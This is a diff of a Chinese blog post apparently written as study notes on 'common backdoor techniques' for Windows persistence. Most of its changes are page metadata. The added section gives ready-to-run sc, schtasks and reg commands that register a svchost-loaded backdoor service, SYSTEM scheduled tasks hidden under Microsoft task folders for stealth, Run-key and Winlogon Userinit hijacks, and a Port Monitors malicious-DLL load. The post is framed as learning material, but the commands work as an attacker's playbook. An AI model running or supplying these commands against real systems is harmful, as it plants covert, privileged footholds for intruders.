@@ -48,7 +48,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2022-11-22T07:52:34.550Z">
-<meta property="article:modified_time" content="2022-11-22T07:54:28.919Z">
+<meta property="article:modified_time" content="2022-11-22T12:57:03.324Z">
 <meta property="article:author" content="JiangA23187">
 <meta property="article:tag" content="权限维持">
 <meta name="twitter:card" content="summary">
@@ -2162,7 +2162,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     root: '/',
     debug: false,
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1669104011804),
+    lastupdate: new Date(1669121837738),
     cdn: {
       izitoast_css: 'https://cdn.bootcdn.net/ajax/libs/izitoast/1.4.0/css/iziToast.min.css',
       izitoast_js: 'https://cdn.bootcdn.net/ajax/libs/izitoast/1.4.0/js/iziToast.min.js',
@@ -2619,13 +2619,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：1k 字</p>
+      <p>字数：1.7k 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fa-solid fa-hourglass-half fa-fw" aria-hidden="true"></i>
-      <p>时长：4 分钟</p>
+      <p>时长：6 分钟</p>
     </a>
   </div>
 
@@ -2700,6 +2700,45 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#创建Backdoor服务，并以svchost加载的方式启动，服务分组为netsvc</span><br><span class="line">sc create Backdoor binpath= &quot;C:\\Windows\System32\svchost.exe -k netsvc&quot; start= auto obj= LocalSystem</span><br><span class="line"></span><br><span class="line">#将Backdoor服务加载的dll设置为shell.dll</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Backdoor\Parameters /v ServiceDll /t REG_EXPAND_SZ /d &quot;C:\Windows\System32\shell.dll&quot;</span><br><span class="line"></span><br><span class="line">#配置服务描述</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor /v Description /t REG_SZ /d &quot;Windows xxx Service&quot;</span><br><span class="line"></span><br><span class="line">#配置服务显示名称</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor /v DisplayName /t REG_SZ /d &quot;Backdoor&quot;</span><br><span class="line"></span><br><span class="line">#创建服务新分组netsvc，并将Backdoor服务添加进去</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost&quot; /v netsvc /t REG_MULTI_SZ /d Backdoor</span><br></pre></td></tr></table></figure>
 
 <p>当系统重启时，svchost将会以system权限加载恶意服务</p>
+<h2 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在目标主机创建Backdoor计划任务，在每天08:00以system权限运行shell.exe</span><br><span class="line">schtasks /Create /TN Backdoor /SC daily /ST 08:00 /MO 1 /TR C:\Windows\System32\shell.exe /RU System /F</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202211221931971.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202211221931971.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221122192907273"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在目标主机创建Backdoor计划任务，在每60s以system权限运行shell.exe</span><br><span class="line">schtasks /Create /TN Backdoor /SC minute /MO 1 /TR C:\Windows\System32\shell.exe /RU System /F</span><br></pre></td></tr></table></figure>
+
+<p>计划任务在windows中存储在计划任务管理库中，存储形式类似文件目录</p>
+<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202211221937372.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202211221937372.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221122193744310"></p>
+<p>因此，为了加强隐蔽性，创建计划任务后门时，可以指定存储目录，而不是存储在根目录下，如以下命令所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /TN \Microsoft\Windows\AppTask\AppRun /SC daily /ST 08:00 /MO 1 /TR C:\Windows\System32\shell.exe /RU System /F</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202211221944570.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202211221944570.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221122194433511"></p>
+<h2 id="启动项-x2F-注册表键后门"><a href="#启动项-x2F-注册表键后门" class="headerlink" title="启动项&#x2F;注册表键后门"></a>启动项&#x2F;注册表键后门</h2><h3 id="1-系统启动文件夹"><a href="#1-系统启动文件夹" class="headerlink" title="1.系统启动文件夹"></a><strong>1.系统启动文件夹</strong></h3><p>将程序放置在启动文件夹会导致该程序在用户登录的时候执行</p>
+<p><strong>以下是windows常见的启动文件夹:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#在所有用户登录时启动</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp </span><br><span class="line">#在指定用户登录时启动</span><br><span class="line">C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-运行键"><a href="#2-运行键" class="headerlink" title="2.运行键"></a><strong>2.运行键</strong></h3><p>通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。</p>
+<p>常用的注册表启动键：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Run键 </span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>
+
+<p>添加运行键</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /v Backdoor /t REG_SZ /d &quot;C:\Windows\System32\shell.exe(创建的后门文件路径)&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-Winlogon-Helper"><a href="#3-Winlogon-Helper" class="headerlink" title="3.Winlogon Helper"></a>3.Winlogon Helper</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#指定Windows身份验证期间执行的程序，默认为exploer.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</span><br><span class="line">#指定用户登陆时执行的用户初始化程序，默认为userinit.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br></pre></td></tr></table></figure>
+
+<p>执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /d &quot;C:\Windows\System32\userinit.exe,shell.exe&quot; /f</span><br></pre></td></tr></table></figure>
+
+<p>将在Userinit键值中添加一个后门程序，在用户登录时启动</p>
+<h3 id="4-Port-Monitors"><a href="#4-Port-Monitors" class="headerlink" title="4.Port Monitors"></a>4.Port Monitors</h3><p>Windows打印服务Print Spooler和进程spoolsv.exe，在添加端口监视器Port Monitors时，可以利用来加载恶意的DLL文件，实现权限维持，因为是系统服务运行，所以权限是SYSTEM，也会用来提权。</p>
+<ul>
+<li><p>利用msf生成恶意dll</p>
+</li>
+<li><p>将生成的dll上传至目标主机的C:\Windows\System32目录，并执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\Test&quot; /v &quot;Driver&quot; /d &quot;shell.dll&quot; /t REG_SZ</span><br></pre></td></tr></table></figure>
+
+<p>当系统注销、启动和重启时都会加载Monitors下Driver指定的dll文件，加载时的权限为system</p>
+</li>
+</ul>
+<p>服务</p>
 
   </div>
   
@@ -2724,7 +2763,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-22T15:54:28+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-22T20:57:03+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：2022年11月22日</p>
@@ -2802,13 +2841,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：1k 字</p>
+      <p>字数：1.7k 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fa-solid fa-hourglass-half fa-fw" aria-hidden="true"></i>
-      <p>时长：4 分钟</p>
+      <p>时长：6 分钟</p>
     </a>
   </div>
 
@@ -2912,7 +2951,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <div class="webinfo-item">
           <div>本站总字数：</div>
-          <div>15.9k 字</div>
+          <div>16.6k 字</div>
         </div>
       
 
@@ -2948,7 +2987,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E5%BB%BA%E7%AB%8B%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7"><span class="toc-text">windows建立隐藏用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-text">系统服务后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1"><span class="toc-text">1.创建系统服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E7%8E%B0%E6%9C%89%E6%9C%8D%E5%8A%A1"><span class="toc-text">2.利用现有服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8svchost-exe%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1"><span class="toc-text">3.利用svchost.exe启动服务</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E5%BB%BA%E7%AB%8B%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7"><span class="toc-text">windows建立隐藏用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-text">系统服务后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1"><span class="toc-text">1.创建系统服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E7%8E%B0%E6%9C%89%E6%9C%8D%E5%8A%A1"><span class="toc-text">2.利用现有服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8svchost-exe%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1"><span class="toc-text">3.利用svchost.exe启动服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-text">计划任务后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9-x2F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%90%8E%E9%97%A8"><span class="toc-text">启动项&#x2F;注册表键后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-text">1.系统启动文件夹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%BF%90%E8%A1%8C%E9%94%AE"><span class="toc-text">2.运行键</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Winlogon-Helper"><span class="toc-text">3.Winlogon Helper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Port-Monitors"><span class="toc-text">4.Port Monitors</span></a></li></ol></li></ol>
     </div>
   </section>
 
@@ -3726,7 +3765,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 
 
   <script>
-  let imgs = ["https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/038.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/025.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/006.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/054.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/056.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/019.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/005.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/012.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/052.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/033.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/042.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/001.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/039.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/004.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/046.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/003.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/002.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/034.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/016.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/035.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/051.webp"];
+  let imgs = ["https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/034.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/051.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/004.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/056.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/054.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/002.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/005.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/012.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/052.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/033.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/019.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/046.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/003.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/035.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/006.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/039.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/025.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/016.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/038.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/001.webp","https://unpkg.com/volantis-static@0.0.1660614606622/media/wallpaper/minimalist/2020/042.webp"];
   let index = 0;
   let IntervalParallax = null;
 
@@ -3977,7 +4016,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Blogs for JiangA23187","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Blogs for JiangA23187"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/学习笔记/","name":"学习笔记"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/11/22/权限维持/","name":"常见后门技术"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Blogs for JiangA23187","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Blogs for JiangA23187","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"常见后门技术","description":"","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/11/22/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},"author":{"@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Blogs for JiangA23187","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/11/22/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","wordCount":0,"datePublished":"2022-11-22T07:52:34.550Z","dateModified":"2022-11-22T07:54:28.919Z","articleSection":"学习笔记","keywords":"权限维持","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Blogs for JiangA23187","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Blogs for JiangA23187"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/学习笔记/","name":"学习笔记"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/11/22/权限维持/","name":"常见后门技术"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Blogs for JiangA23187","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Blogs for JiangA23187","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"常见后门技术","description":"","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/11/22/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},"author":{"@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Blogs for JiangA23187","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/11/22/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","wordCount":0,"datePublished":"2022-11-22T07:52:34.550Z","dateModified":"2022-11-22T12:57:03.324Z","articleSection":"学习笔记","keywords":"权限维持","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
